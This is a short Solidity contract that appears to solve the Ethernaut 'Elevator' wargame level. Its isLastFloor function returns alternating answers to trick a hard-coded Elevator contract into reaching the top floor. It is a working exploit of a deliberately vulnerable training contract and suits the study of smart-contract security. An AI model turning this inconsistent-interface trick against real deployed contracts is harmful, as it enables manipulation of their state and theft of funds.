// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract Building {

    bool private toggle = false;

    function isLastFloor(uint) external returns (bool) {
        toggle = !toggle;
        return !toggle;     
    }

    Elevator public elevator = Elevator(0xB2147554fC7B3bfce4c3657efFC2396fd8160624); 
    
    function attack() public {
        elevator.goTo(1);
    }
}